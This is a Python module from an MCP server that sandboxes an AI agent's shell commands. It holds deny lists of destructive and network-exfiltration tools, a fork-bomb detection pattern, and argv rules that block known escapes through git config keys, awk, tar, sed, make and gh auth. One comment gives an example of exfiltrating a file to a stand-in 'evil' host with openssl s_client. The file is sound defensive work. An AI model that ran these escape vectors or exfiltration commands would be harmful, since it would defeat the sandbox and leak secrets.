"""
Kim MCP Server — Shell Execution Tools

Provides run_command and run_powershell tools with:
  - Blocked-command filtering (shlex-based, exact-match deny set)
  - Metacharacter rejection for command chaining, process substitution, and
    subshell grouping
  - Per-segment vetting when allow_chaining=True (finding 2)
  - Cross-platform command translation via os_utils
  - Platform-aware PowerShell / bash fallback
"""

from __future__ import annotations

import asyncio
import os
import logging
import re
import shlex
import signal
import tempfile

from mcp_server.config import SHELL_SANDBOX_MODE, SHELL_TIMEOUT, validate_path, PROJECT_ROOT
from mcp_server.os_utils import (
    CURRENT_OS,
    IS_WINDOWS,
    IS_MACOS,
    IS_LINUX,
    minimal_subprocess_env,
    translate_command,
)

logger = logging.getLogger(__name__)

# Hard upper bound on a model-supplied `timeout` argument (seconds). The tool
# schema places no maximum, so without this a model could request an arbitrarily
# long timeout and keep the command executing on the server long after the agent
# client abandoned the call — the model then re-issues it and the side effect
# happens twice (finding 2.1). The agent-side client-timeout cap
# (orchestrator/agent.py _MAX_SHELL_EXEC_S) is kept in sync with this ceiling so
# the client always waits strictly longer than the server can legitimately run.
MAX_SHELL_TIMEOUT_S = 600


def _clamp_shell_timeout(raw: object) -> int:
    """Coerce a model-supplied timeout to a positive int within the hard cap."""
    try:
        val = int(raw)  # type: ignore[arg-type]
    except (TypeError, ValueError):
        return SHELL_TIMEOUT
    if val < 1:
        return 1
    if val > MAX_SHELL_TIMEOUT_S:
        return MAX_SHELL_TIMEOUT_S
    return val


# ── Deny sets ─────────────────────────────────────────────────────────────────
#
# CODE-OWNED (F-G-4): the deny sets below are deliberately NOT config-driven.
# There is no `shell.blocked_commands` (or similar) config key, and none may
# be added — config must never be able to weaken or replace a code-owned
# safety gate, and a config key that *claims* to extend blocking while being
# read by nothing (as the old `blocked_commands` key was) is worse than none
# at all. Config can only ADD allowed binaries (`shell.allowlist_extra` /
# `shell.safe_extra`, read in policy.py); anything denied here stays denied
# regardless of config.

# Commands that are unconditionally blocked (first token after shlex.split).
# Includes network-transfer tools that can exfiltrate secret files in a single
# call, bypassing the validate_path sandbox (finding 3, partial — cat/cp/mv
# require a tier-based confirmation system outside this module's scope).
_DENY_COMMANDS = frozenset({
    # Destructive filesystem tools — includes the cmd.exe aliases `erase`
    # (== del) and `rd` (== rmdir) so `rd /s /q C:\...` cannot slip past (1.2)
    "rm", "rmdir", "rd", "del", "erase", "format", "diskpart", "mkfs", "dd", "shred",
    # Truncation (finding 5)
    "truncate",
    # Network / exfiltration tools (finding 3, partial). ftp/sftp/telnet move
    # arbitrary files or open an interactive remote shell in one call, same
    # class of risk as scp/rsync above. ssh is included too: this codebase
    # has no legitimate flow that shells out to the `ssh` binary (searched
    # mcp_server/, orchestrator/, cli/, desktop/ -- the only `ssh` hits are
    # ~/.ssh path references in the sensitive-path deny list, never an
    # invocation of the ssh binary itself), and an interactive/command-mode
    # ssh call is a direct remote-exec/exfiltration primitive that the
    # allowlist model (S2) is specifically designed to keep out of run_command.
    "curl", "wget", "scp", "rsync", "nc", "netcat",
    "ftp", "sftp", "ssh", "telnet",
})

# Regex patterns that catch common destructive payloads even in arguments
_DENY_PATTERNS = [
    re.compile(r":\(\)\s*\{[^}]*\|[^}]*&\s*\}\s*;?\s*:", re.DOTALL),  # fork bomb
    re.compile(r"\bchmod\s+(-\w\s+)*777\s+/\s*$"),  # chmod -R 777 /
    re.compile(r"\bdd\b.*\bif=/dev/zero\b"),  # dd if=/dev/zero
    # `openssl s_client` opens a raw TCP connection and can pipe file
    # contents out over it (`openssl s_client -connect evil:443 < secret`) --
    # an exfiltration primitive equivalent to nc/curl. `openssl` itself stays
    # off the deny set (cert generation, hashing, etc. are legitimate), so
    # this is a narrow argv-pattern rule rather than a whole-binary block,
    # the same treatment `find -delete` gets instead of blocking `find`.
    re.compile(r"\bopenssl\s+s_client\b"),
]

# Fast-path metacharacter regex: catches chaining, command/process substitution.
# NOTE: bare '>' and '<' (plain redirection) are intentionally excluded here —
# existing callers depend on redirection working (e.g. `printf x > file`).
# Process substitution '<(...)' / '>(' is caught by the '<\(' / '>\(' patterns.
# \n and \r are included: POSIX shells treat newline like ';' as a separator.
_CHAIN_METACHAR_RE = re.compile(r"[;|`\n\r]|(?<!>)&(?!>)|\$\(|<\(|>\(")

# Operator-level split used to isolate individual segments when chaining is
# allowed.  '&&' and '||' must appear before the single-char alternatives so
# the two-char forms consume both characters first (finding 2).
_OPERATOR_SPLIT_RE = re.compile(r"&&|\|\||[;|\n\r&]")

# Regex for shell redirection operators after shlex.split (e.g. ">", ">>", "2>", "&>").
# Used to detect redirections targeting absolute paths (finding 1a).
# Plain redirection to a *relative* name is allowed so that `printf probe > file`
# keeps working in sandbox tests.
_REDIR_OP_RE = re.compile(r"^\d*>>?$|^&>>?$")

# Regex that matches a leading redirect-operator prefix inside a no-space token
# like '>/etc/passwd' or '>>/abs/path' (finding 1).  The captured remainder after
# the prefix is the redirect target and must be validated like the space-separated
# form.  Covers \d*>> ?, &>> ?, and < (input redirect).
_REDIR_PREFIX_RE = re.compile(r"^(\d*>>?|&>>?|<)")

# /usr/local/bin (and /snap/bin on Linux) are included so translated app
# launches (google-chrome, gedit, snap-installed tools) resolve under the
# sandbox PATH (1.3).
_SANDBOX_PATH = "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
if IS_LINUX and os.path.isdir("/snap/bin"):
    _SANDBOX_PATH += ":/snap/bin"

# Absolute-path redirect targets: POSIX ("/etc/passwd"), Windows drive-absolute
# ("C:\Windows\...", "C:/Windows/..."), and UNC ("\\server\share") forms (1.2).
# Matches any drive-letter prefix (not just drive+slash) because POSIX-mode
# shlex strips backslashes, turning 'C:\Windows\x' into 'C:Windowsx' — the
# drive prefix is the reliable invariant. Drive-relative targets ("C:file")
# escape the cwd too, so blocking them is correct, not collateral.
_WIN_ABS_TARGET_RE = re.compile(r"^[A-Za-z]:")


def _is_blocked_redirect_target(target: str) -> bool:
    """True when a redirect target is an absolute path (POSIX, Windows
    drive-absolute, or UNC) outside the safe set, or contains traversal."""
    if ".." in target:
        return True
    if target in _SAFE_ABSOLUTE_REDIRECTS:
        return False
    # A single leading backslash covers both UNC (\\server\...) and
    # root-relative (\Windows\...) forms — including after POSIX-mode shlex
    # collapses doubled backslashes.
    return (
        target.startswith("/")
        or target.startswith("\\")
        or bool(_WIN_ABS_TARGET_RE.match(target))
    )

# Env vars that can be used for code injection even in non-sandboxed mode.
# An operator may disable the sandbox for legitimate reasons, but the child
# process should still never inherit dynamic-linker or interpreter-path
# overrides that a compromised parent environment might carry (finding 2,
# part c — 'Never inherit full parent env for non-sandboxed runs').
_DANGEROUS_ENV_VARS = frozenset({
    # Dynamic linker / runtime injection (Linux)
    "LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "LD_DEBUG",
    # Dynamic linker / runtime injection (macOS)
    "DYLD_INSERT_LIBRARIES", "DYLD_LIBRARY_PATH", "DYLD_FRAMEWORK_PATH",
    # Python startup and module-path manipulation
    "PYTHONSTARTUP", "PYTHONPATH",
    # Node.js / Ruby / Perl module paths
    "NODE_PATH", "RUBYLIB", "PERL5LIB", "PERLLIB",
})

_ENV_ASSIGNMENT_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=")
_SAFE_ABSOLUTE_REDIRECTS = frozenset({"/dev/null", "/dev/stdout", "/dev/stderr"})


# ── Argv-level exec-capable-binary policy (F-C-1 / F-C-2) ──────────────────────
#
# ROOT CAUSE this closes: the shell allowlist (policy.py `_ALLOWED_MUTATING`)
# trusts a program by *name*, on the assumption that an allowlisted binary only
# does its nominal job. That assumption is false for a family of "local-dev"
# binaries that are themselves general-purpose command runners / arbitrary-file
# readers: `git -c alias.x=!<sh>`, `awk 'BEGIN{system(...)}'`,
# `tar --checkpoint-action=exec=<cmd>`, `sed` `e`/`s///e`, `make -f`. Each execs
# arbitrary shell (or reads any absolute path — e.g. a secret — from *inside* its
# own argument grammar, where the token-shape path scan can't see it), so an
# allowlisted invocation becomes un-approved RCE + secret disclosure.
#
# A name-blocklist cannot fix this (the names are legitimately allowlisted). The
# durable fix is an ARGV-LEVEL policy: for each known exec-capable binary, inspect
# its arguments and BLOCK the specific escape vectors while leaving the binary's
# benign uses (`git status`, `awk '{print $1}'`, `tar -xzf`, `sed 's/a/b/'`)
# working. This deny-set is CODE-OWNED — never config-driven (CLAUDE.md invariant:
# config must never weaken a code-owned gate).
#
# Because handle_run_command returns the BLOCKED string before dispatch, a hit
# here denies the command outright — strictly stronger than escalating it to HITL
# (the risk-threshold HITL arm in policy.py is default-off, so a "risk=high but no
# escalation" command would otherwise dispatch unattended; blocking removes that
# window entirely).

# git config keys that git will execute as an external program, or use to read
# an arbitrary file, when set via `-c KEY=VALUE` / `--config-env`. Matched
# case-insensitively. This is the code-owned core of the F-C-1 gate.
_GIT_DANGEROUS_CONFIG_KEYS = frozenset({
    "core.fsmonitor",
    "core.pager",
    "core.editor",
    "core.sshcommand",
    "core.hookspath",
    "sequence.editor",
    "diff.external",
    "gpg.program",
    "gpg.openpgp.program",
    "gpg.ssh.program",
    "credential.helper",
    "uploadpack.packobjectshook",
    "protocol.ext.allow",
})

# ...and any config key with one of these suffixes is a program/command hook
# (matches per-remote / per-helper variants like `credential.https://x.helper`,
# `diff.<driver>.command`, `filter.<x>.clean`, `alias.<x>`). Suffix-matched so
# new hook names in this shape are covered without an exhaustive enumeration.
_GIT_DANGEROUS_CONFIG_SUFFIXES = (
    ".command",
    ".process",
    ".program",
    ".helper",
    ".external",
    ".editor",
    ".pager",
    ".sshcommand",
    ".fsmonitor",
    ".hookspath",
    ".packobjectshook",
    ".clean",
    ".smudge",
    ".textconv",
)


def _git_config_token_is_dangerous(key: str, value: str | None) -> bool:
    """True when a `git -c KEY=VALUE` (or `--config-env KEY=ENVVAR`) token can
    exec a program or read an arbitrary file.

    - Any `!`-prefixed value is a shell alias body (`alias.x=!<sh>`) — always
      dangerous regardless of key.
    - Any key in the code-owned dangerous set, or ending in a program/command
      hook suffix, lets git run VALUE as an external program.
    """
    if value is not None and value.lstrip().startswith("!"):
        return True
    key_low = key.strip().lower()
    if key_low in _GIT_DANGEROUS_CONFIG_KEYS:
        return True
    return any(key_low.endswith(suffix) for suffix in _GIT_DANGEROUS_CONFIG_SUFFIXES)


def _check_git_argv(tokens: list[str]) -> str | None:
    """F-C-1: block `git -c`/`--config`/`--config-env` config-injection RCE and
    absolute-path secret reads that hide inside the config token.

    Leaves ordinary git usage (`git status/diff/commit/log`, and even benign
    `-c user.email=x`) working — only the exec/secret-read config keys and
    `!`-prefixed alias bodies are denied. Legitimate needs for the dangerous
    keys should route through the structured git_* MCP tools, not run_command.
    """
    i = 1  # tokens[0] == "git"
    while i < len(tokens):
        tok = tokens[i]
        pair: str | None = None
        if tok in ("-c", "--config", "--config-env"):
            # Space-separated form: value is the next token.
            pair = tokens[i + 1] if i + 1 < len(tokens) else ""
            i += 2
        elif tok.startswith("--config-env=") or tok.startswith("--config="):
            pair = tok.split("=", 1)[1]
            i += 1
        elif tok.startswith("-c") and len(tok) > 2:
            # Glued short form `-ckey=val` (git accepts this).
            pair = tok[2:]
            i += 1
        else:
            i += 1
            continue
        # pair is "KEY=VALUE" (or "KEY" alone for a boolean/no-value config).
        if "=" in pair:
            key, value = pair.split("=", 1)
        else:
            key, value = pair, None
        if _git_config_token_is_dangerous(key, value):
            return (
                "BLOCKED: 'git -c'/'--config-env' with an executable config key "
                f"({key!r}) is denied — it can run arbitrary commands or read "
                "secret files. Use the git_* tools for legitimate git operations."
            )
    return None


# awk/gawk/mawk program fragments that exec a shell or read/write arbitrary
# files from inside the program string (never a path-shaped token, so the path
# scan is blind to them). `system(...)`, `... | getline` / `"cmd" | getline`,
# `print/printf > file` and `print/printf | "cmd"` are the exec/IO vectors.
_AWK_SYSTEM_RE = re.compile(r"\bsystem\s*\(")
_AWK_GETLINE_RE = re.compile(r"\bgetline\b")
_AWK_PRINT_REDIR_RE = re.compile(r"\bprintf?\b[^;{}\n]*[>|]")


def _check_awk_argv(tokens: list[str]) -> str | None:
    """F-C-2: block awk/gawk/mawk programs that exec commands (`system`,
    `|getline`, `print|\"cmd\"`) or read/write arbitrary files (`print > file`,
    `getline < file`). Leaves field-processing programs (`awk '{print $1}'`)
    working."""
    for tok in tokens[1:]:
        if tok.startswith("-") and tok != "--":
            continue  # a flag, not the program text
        if (
            _AWK_SYSTEM_RE.search(tok)
            or _AWK_GETLINE_RE.search(tok)
            or _AWK_PRINT_REDIR_RE.search(tok)
        ):
            return (
                "BLOCKED: awk program uses an exec/IO feature "
                "(system()/getline/print-redirect) — this is an allowlist escape."
            )
    return None


# tar options that run an external program (GNU/bsd tar).
_TAR_EXEC_FLAGS = frozenset({
    "--checkpoint-action",
    "--to-command",
    "--use-compress-program",
    "--rmt-command",
    "--info-script",
    "--new-volume-script",
    "-I",  # short form of --use-compress-program (runs an arbitrary program)
})


def _check_tar_argv(tokens: list[str]) -> str | None:
    """F-C-2: block tar options that exec an external program
    (`--checkpoint-action=exec=`, `--to-command`, `--use-compress-program`/`-I`,
    `--rmt-command`, `--info-script`). Leaves archive create/extract
    (`tar -xzf`, `tar -czf`) working."""
    for tok in tokens[1:]:
        head = tok.split("=", 1)[0]
        if head in _TAR_EXEC_FLAGS:
            return (
                f"BLOCKED: tar option {head!r} runs an external program — "
                "this is an allowlist escape."
            )
    return None


# sed script commands that exec a shell (`e`, `s///e`) or read/write arbitrary
# files (`w`/`W`/`r`/`R`). Detected on the script tokens; `-i` in-place edit is
# also blocked (writes outside the redirect/path gate). `sed 's/a/b/'`,
# `sed -n '1,5p'` stay working.
# A sed command letter sits at a "command position": at the start of the script,
# after a command separator (`;`/`}`/newline), or right after a numeric/`$`
# address (`1e`, `$w`, `5,10w`).
_SED_EXEC_CMD_RE = re.compile(r"(?:^|[;}\n]|\d|\$)\s*e(?=[\s;}]|$)")   # `e` execute
_SED_S_EFLAG_RE = re.compile(r"s([^\w\s])(?:\\.|[^\\])*?\1(?:\\.|[^\\])*?\1[a-z]*e", re.DOTALL)  # s///e
_SED_WR_CMD_RE = re.compile(r"(?:^|[;}\n]|\d|\$)\s*[wWrR](?=[\s;}]|$)")  # write/read file commands
# F-C-2 residual (handed off by the hotfix): `/regex/`-ADDRESSED exec/IO
# commands — `sed '/foo/e'`, `sed '/foo/w out'`, `sed '1,/foo/r in'`,
# `sed '/a/,/b/W f'`, `sed '/foo/!e cmd'`. A regex address is a `/…/` group at a
# command boundary (start, `;`, `{`, `}`, newline, or `,` inside a range) — it is
# distinguished from an `s///`/`y///` command because those are preceded by the
# `s`/`y` letter, so the `/` is NOT at a boundary (`s/were/x/` won't match). Only
# the exec/file-IO command letters `e`/`w`/`W`/`r`/`R` after the address are
# blocked; safe address commands (`/foo/d`, `/foo/p`, `/foo/{…}`) are untouched.
_SED_ADDR_EXEC_RE = re.compile(
    r"(?:^|[;{}\n,])\s*/(?:\\.|[^/\\\n])+/\s*!?\s*[ewWrR](?=[\s;}]|$)"
)


def _check_sed_argv(tokens: list[str]) -> str | None:
    """F-C-2: block sed scripts that exec (`e`, `s///e`) or do file IO
    (`w`/`r`), and in-place edits (`-i`). Also blocks `/regex/`-addressed exec/IO
    commands (`/foo/e`, `/foo/w file`). Leaves substitution/print scripts
    (`sed 's/a/b/'`, `sed -n '1,5p'`, `sed '/foo/d'`) working."""
    for tok in tokens[1:]:
        if tok in ("-i", "--in-place") or tok.startswith("-i") or tok.startswith("--in-place"):
            return "BLOCKED: sed in-place edit (-i) writes files outside the path gate."
        if tok.startswith("-") and tok not in ("-e", "-f"):
            continue
        if tok in ("-e", "-f"):
            continue  # the script is the following token, checked on its own pass
        if (
            _SED_EXEC_CMD_RE.search(tok)
            or _SED_S_EFLAG_RE.search(tok)
            or _SED_WR_CMD_RE.search(tok)
            or _SED_ADDR_EXEC_RE.search(tok)
        ):
            return (
                "BLOCKED: sed script uses an exec/file-IO command "
                "(e / s///e / w / r, incl. /regex/-addressed) — "
                "this is an allowlist escape."
            )
    return None


def _check_make_argv(tokens: list[str]) -> str | None:
    """F-C-2: block `make -f <makefile>` / `--makefile` / `--eval` — running an
    attacker-supplied makefile or inline recipe is arbitrary command execution.
    Plain `make` (default ./Makefile) is unaffected."""
    for tok in tokens[1:]:
        head = tok.split("=", 1)[0]
        if head in ("-f", "--file", "--makefile", "--eval"):
            return (
                f"BLOCKED: make option {head!r} runs an arbitrary makefile/recipe "
                "— this is an allowlist escape."
            )
    return None


def _check_gh_argv(tokens: list[str]) -> str | None:
    """F-C-3: block `gh` subcommands that PRINT the stored GitHub credential to
    stdout — `gh auth token`, `gh auth status --show-token`, `gh auth login`.

    The token lives in `~/.config/gh/hosts.yml`, which validate_path denies as a
    path argument, but `gh` reads it internally so no path token is ever
    inspected — the filename sandbox is bypassed (same class as the F-C-1/F-C-2
    exec escapes: an allowlisted binary reading its OWN secret store). Leaves
    ordinary gh usage (`gh pr`, `gh issue`, `gh repo`, `gh api`) working."""
    # Non-flag words after `gh`, in order, give the subcommand path.
    words = [t for t in tokens[1:] if not t.startswith("-")]
    if len(words) >= 2 and words[0] == "auth":
        action = words[1]
        if action in ("token", "login"):
            return (
                f"BLOCKED: 'gh auth {action}' exposes/writes the stored GitHub "
                "credential — denied (credential exfiltration via an allowlisted "
                "binary)."
            )
        if action == "status" and any(
            t in ("--show-token", "-t") for t in tokens[1:]
        ):
            return (
                "BLOCKED: 'gh auth status --show-token' prints the stored GitHub "
                "token to stdout — denied (credential exfiltration)."
            )
    return None


# Dispatch table: basename → argv policy. Code-owned; never config-driven.
_EXEC_CAPABLE_ARGV_POLICY = {
    "git": _check_git_argv,
    "awk": _check_awk_argv,
    "gawk": _check_awk_argv,
    "mawk": _check_awk_argv,
    "tar": _check_tar_argv,
    "gtar": _check_tar_argv,
    "bsdtar": _check_tar_argv,
    "sed": _check_sed_argv,
    "gsed": _check_sed_argv,
    "make": _check_make_argv,
    "gmake": _check_make_argv,
    "gh": _check_gh_argv,
}


def _check_exec_capable_binary(command_tokens: list[str]) -> str | None:
    """Apply the argv-level escape-vector policy to an allowlisted but
    exec-capable binary. `command_tokens` must start with the binary token
    (env assignments and wrappers already stripped). Returns a BLOCKED message
    or None."""
    if not command_tokens:
        return None
    base = _basename(command_tokens[0])
    policy = _EXEC_CAPABLE_ARGV_POLICY.get(base)
    if policy is None:
        return None
    return policy(command_tokens)


def _filtered_env() -> dict[str, str]:
    """Return the minimal allowlist env for non-sandbox subprocess runs (S4).

    Historically this was the full parent env minus _DANGEROUS_ENV_VARS; that
    still leaked every provider API key and token in the parent process to
    the child. It is now a positive allowlist (PATH/HOME/locale/display —
    see os_utils.minimal_subprocess_env), so injection vectors AND secrets
    are excluded by construction.
    """
    return minimal_subprocess_env()


def _sandbox_enabled() -> bool:
    """Return the operator-level sandbox mode flag.

    Intentionally does NOT accept model-supplied args — sandbox_mode must be
    set via operator/server config (SHELL_SANDBOX_MODE) only (finding 2).
    """
    return SHELL_SANDBOX_MODE


def _sandbox_env() -> dict[str, str]:
    """Build a minimal, safe environment for sandboxed subprocess execution.

    POSIX: restricts PATH to standard system directories, sets HOME/TMPDIR.
    Windows: uses the Windows-appropriate equivalents so cmd.exe can start
    (finding 3).
    """
    if IS_WINDOWS:
        system_root = os.environ.get("SystemRoot", r"C:\Windows")
        env: dict[str, str] = {
            "Path": rf"{system_root}\System32;{system_root}",
            "SystemRoot": system_root,
            "TEMP": tempfile.gettempdir(),
            "TMP": tempfile.gettempdir(),
            "USERPROFILE": str(PROJECT_ROOT),
        }
        # Preserve ComSpec so cmd.exe knows its own path
        comspec = os.environ.get("ComSpec")
        if comspec:
            env["ComSpec"] = comspec
        return env
    # POSIX (macOS / Linux) — unchanged behaviour
    env = {
        "PATH": _SANDBOX_PATH,
        "HOME": str(PROJECT_ROOT),
        "TMPDIR": tempfile.gettempdir(),
        "LANG": os.environ.get("LANG", "C.UTF-8"),
        "LC_ALL": os.environ.get("LC_ALL", ""),
    }
    return {key: value for key, value in env.items() if value}


def _kill_process_tree(proc: asyncio.subprocess.Process) -> None:
    """Kill the subprocess and, on POSIX, its whole process group (L4).

    Requires the child to have been spawned with ``start_new_session=True``;
    otherwise falls back to killing just the immediate child.
    """
    try:
        if not IS_WINDOWS and hasattr(os, "killpg"):
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            return
    except (ProcessLookupError, PermissionError, OSError):
        pass
    try:
        proc.kill()
    except ProcessLookupError:
        pass


def _basename(token: str) -> str:
    return token.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()


def _looks_like_shell_assignment(token: str) -> bool:
    """True for VAR=value shell-assignment-shaped tokens.

    Mirrors mcp_server/policy.py's `_looks_like_assignment` so the two
    independent defense-in-depth layers agree on what counts as an inline
    environment assignment. A leading '/', '\\', '-', '.', or '~' rules out
    assignment-shaped strings that are actually paths or flags (e.g.
    `--foo=bar`, `./FOO=bar`).
    """
    eq = token.find("=")
    if eq <= 0 or token.startswith(("/", "\\", "-", ".", "~")):
        return False
    return token[:eq].replace("_", "a").isalnum()


def _strip_leading_env_assignments(tokens: list[str]) -> list[str]:
    """Drop leading VAR=value assignment tokens so the real command name is
    what gets checked against the deny set (finding: `FOO=bar rm -rf /tmp/x`
    previously evaded the check below because tokens[0] was "FOO=bar", not
    "rm"). Only LEADING assignments are stripped -- once a non-assignment
    token appears, everything after it is the command and its arguments.
    """
    rest = list(tokens)
    while rest and _looks_like_shell_assignment(rest[0]):
        rest = rest[1:]
    return rest


def _first_non_option(tokens: list[str], start: int = 0) -> str | None:
    for token in tokens[start:]:
        if token == "--":
            continue
        if token.startswith("-"):
            continue
        if "=" in token and not token.startswith(("/", "\\")):
            continue
        return token
    return None


def _check_single_segment(cmd: str, powershell: bool = False) -> str | None:
    """Vet one already-isolated command segment (no chaining metacharacters
    expected at this level).  Returns an error string or None if safe.

    ``powershell=True`` relaxes the POSIX-substitution checks that collide
    with PowerShell's own grammar (M2): the backtick is PS's *escape*
    character (`` `n `` == newline) and ``$( )`` is its subexpression syntax,
    not sh command substitution — the script never reaches /bin/sh.
    """
    cmd_clean = cmd.strip()
    if not cmd_clean:
        return None

    # Subshell group: an unquoted leading '(' opens a subshell (finding 1)
    if cmd_clean.startswith("("):
        return "BLOCKED: Command contains a subshell group"

    # Backtick command substitution: shlex does NOT strip backticks, so they
    # survive as literal characters and execute via /bin/sh.  Block here so
    # that `echo \`rm -rf /tmp/x\`` is caught even when allow_chaining=True
    # (finding 1b — backtick stays in one segment after operator split).
    if "`" in cmd_clean and not powershell:
        return "BLOCKED: Command contains backtick command substitution"

    try:
        tokens = shlex.split(cmd_clean)
    except ValueError:
        # Malformed quoting — treat as suspicious
        return "BLOCKED: Command has malformed shell quoting"

    if not tokens:
        return None

    # Removing dangerous variables from the inherited environment is not
    # sufficient: a shell command can set them inline (directly or through
    # wrappers such as ``env`` / ``sudo env``).  Reject those assignments
    # wherever they occur in the command token stream.
    for token in tokens:
        assignment = _ENV_ASSIGNMENT_RE.match(token)
        if assignment and assignment.group(1) in _DANGEROUS_ENV_VARS:
            return (
                "BLOCKED: Inline assignment to dangerous environment variable "
                f"'{assignment.group(1)}'"
            )

    # Detect process/command substitution tokens that may survive operator
    # splitting (e.g. the <(rm ...) token in `cat <(rm ...)`) (finding 1).
    # In PowerShell mode `$(…)` is the subexpression syntax (M2), but
    # process substitution `<(`/`>(` has no PS meaning and stays blocked.
    blocked_prefixes = ("<(", ">(") if powershell else ("<(", ">(", "$(")
    for token in tokens:
        if token.startswith(blocked_prefixes):
            return "BLOCKED: Command contains process or command substitution"

    # Redirection to an absolute path or parent-directory traversal is blocked
    # (finding 1a).  Relative redirects (`printf probe > file`) are allowed so
    # the sandbox write-isolation test keeps passing.
    #
    # Two forms must be caught:
    #   Space-separated : tokens[i] == '>'  and tokens[i+1] == '/etc/passwd'
    #   No-space        : tokens[i] == '>/etc/passwd'  (single merged token)
    for i, tok in enumerate(tokens):
        # Space-separated form: standalone operator followed by separate target
        if _REDIR_OP_RE.match(tok) and i + 1 < len(tokens):
            if _is_blocked_redirect_target(tokens[i + 1]):
                return "BLOCKED: Redirection to absolute path or parent traversal"
        # No-space form: operator prefix merged with target in the same token
        # e.g. '>/etc/passwd', '>>/abs/p', '2>/dev/null', '< /etc/shadow'
        m = _REDIR_PREFIX_RE.match(tok)
        if m and m.end() < len(tok):
            if _is_blocked_redirect_target(tok[m.end():]):
                return "BLOCKED: Redirection to absolute path or parent traversal"

    # Strip leading VAR=value shell-assignment tokens before identifying the
    # real command. Without this, `FOO=bar rm -rf /tmp/x` evades the deny-set
    # check below entirely: tokens[0] is the string "FOO=bar", not "rm", so
    # `_basename(tokens[0])` never resolves to a blocked command. This mirrors
    # policy.py's `_split_assignments`/`_looks_like_assignment` (the other
    # policy layer already closes this gap) so the two independent checks
    # agree — this module's own docstring already claims to be a
    # defense-in-depth layer for exactly this class of bypass.
    command_tokens = _strip_leading_env_assignments(tokens)
    if not command_tokens:
        return None

    first_cmd = _basename(command_tokens[0])
    if first_cmd in _DENY_COMMANDS:
        return f"BLOCKED: '{first_cmd}' is a blocked command"

    # Argv-level escape-vector policy for allowlisted-but-exec-capable binaries
    # (git -c / awk system() / tar --checkpoint-action / sed e / make -f).
    # F-C-1 / F-C-2 — the headline allowlist escapes.
    exec_msg = _check_exec_capable_binary(command_tokens)
    if exec_msg:
        return exec_msg

    # Dangerous find usage: -delete flag or -exec/-execdir with a blocked cmd
    # (finding 5)
    if first_cmd == "find":
        if "-delete" in command_tokens:
            return "BLOCKED: 'find -delete' is a blocked pattern"
        for i, t in enumerate(command_tokens):
            if t in {"-exec", "-execdir"} and i + 1 < len(command_tokens):
                exec_name = _basename(command_tokens[i + 1])
                if exec_name in _DENY_COMMANDS:
                    return f"BLOCKED: 'find {t} {exec_name}' is a blocked pattern"

    # xargs executes its first non-option argument as a command.
    # Handles both `-I{}` (no-space) and `-I {}` (space-separated) replacement
    # forms: skip the placeholder token that follows `-I` so that the actual
    # command is correctly identified (finding 2 / finding 5).
    if first_cmd == "xargs":
        xargs_cmd: str | None = None
        i = 1
        while i < len(command_tokens):
            t = command_tokens[i]
            if t == "-I" and i + 1 < len(command_tokens):
                # Space-separated: `-I PLACEHOLDER COMMAND …` — skip placeholder
                i += 2
                continue
            if t == "--":
                i += 1
                continue
            if t.startswith("-"):
                i += 1
                continue
            if "=" in t and not t.startswith(("/", "\\")):
                i += 1
                continue
            xargs_cmd = t
            break
        if xargs_cmd:
            xargs_name = _basename(xargs_cmd)
            if xargs_name in _DENY_COMMANDS:
                return f"BLOCKED: 'xargs {xargs_name}' is a blocked command"

    # Wrapper commands can hide a blocked command as the next token.
    # busybox is included because it proxies any coreutil by name (finding 5).
    if first_cmd in {"sudo", "doas", "command", "env", "nohup", "nice", "time", "busybox"}:
        wrapped = _first_non_option(command_tokens, 1)
        if wrapped:
            wrapped_name = _basename(wrapped)
            if wrapped_name in _DENY_COMMANDS:
                return f"BLOCKED: '{wrapped_name}' is a blocked command"
            wrapped_index = next(i for i in range(1, len(command_tokens)) if command_tokens[i] == wrapped)
            # Apply the exec-capable argv policy to the UNWRAPPED command too, so
            # `sudo git -c alias.x=!sh x` / `env awk 'BEGIN{system(...)}'` are
            # blocked (the wrapper hides the real binary from the direct check
            # above). F-C-1 / F-C-2.
            wrapped_exec_msg = _check_exec_capable_binary(command_tokens[wrapped_index:])
            if wrapped_exec_msg:
                return wrapped_exec_msg
            if wrapped_name in {"sudo", "doas", "command", "env", "nohup", "nice", "time", "sh", "bash", "zsh", "fish"}:
                nested_msg = _check_single_segment(
                    " ".join(command_tokens[wrapped_index:]), powershell=powershell
                )
                if nested_msg:
                    return f"BLOCKED: wrapper contains blocked command. {nested_msg}"
            # busybox can proxy `find` — apply find-specific -delete/-exec checks
            # even though `find` itself is not in _DENY_COMMANDS (finding 5).
            if wrapped_name == "find":
                subtokens = command_tokens[wrapped_index:]
                if "-delete" in subtokens:
                    return "BLOCKED: 'find -delete' is a blocked pattern (via wrapper)"
                for i, t in enumerate(subtokens):
                    if t in {"-exec", "-execdir"} and i + 1 < len(subtokens):
                        exec_name = _basename(subtokens[i + 1])
                        if exec_name in _DENY_COMMANDS:
                            return f"BLOCKED: 'find {t} {exec_name}' is a blocked pattern (via wrapper)"

    # Shell wrappers (`bash -c`, `sh -c`, etc.) must recursively vet the script.
    if first_cmd in {"sh", "bash", "zsh", "fish"}:
        try:
            c_index = command_tokens.index("-c")
        except ValueError:
            c_index = -1
        if c_index >= 0 and c_index + 1 < len(command_tokens):
            nested_msg = _check_blocked(command_tokens[c_index + 1], allow_chaining=False)
            if nested_msg:
                return f"BLOCKED: shell wrapper contains blocked command. {nested_msg}"

    return None


def _check_blocked(cmd: str, allow_chaining: bool = False, powershell: bool = False) -> str | None:
    """Check if a command should be blocked. Returns an error message or None.

    ``powershell=True`` vets a PowerShell script: POSIX-only substitution
    checks (backtick, ``$( )``) are relaxed because they are ordinary PS
    syntax (M2); the deny-command and redirect checks still apply.
    """
    cmd_stripped = cmd.strip()

    # 1. Check for dangerous regex patterns in raw command
    for pat in _DENY_PATTERNS:
        if pat.search(cmd_stripped):
            return "BLOCKED: Command matches dangerous pattern"

    # 2. Subshell-group fast path: a command that starts with '(' is a subshell
    #    (finding 1 — catches `(rm -rf /)` before shlex parsing)
    if cmd_stripped.startswith("("):
        return "BLOCKED: Command starts with a subshell group"

    # 3. Metacharacter handling
    if _CHAIN_METACHAR_RE.search(cmd_stripped):
        if not allow_chaining:
            return (
                "BLOCKED: Command contains chaining/injection metacharacters "
                "(;, &&, ||, |, `, $(...), <(...), >(...) or similar). "
                "Use separate run_command calls for each command, or pass allow_chaining=True."
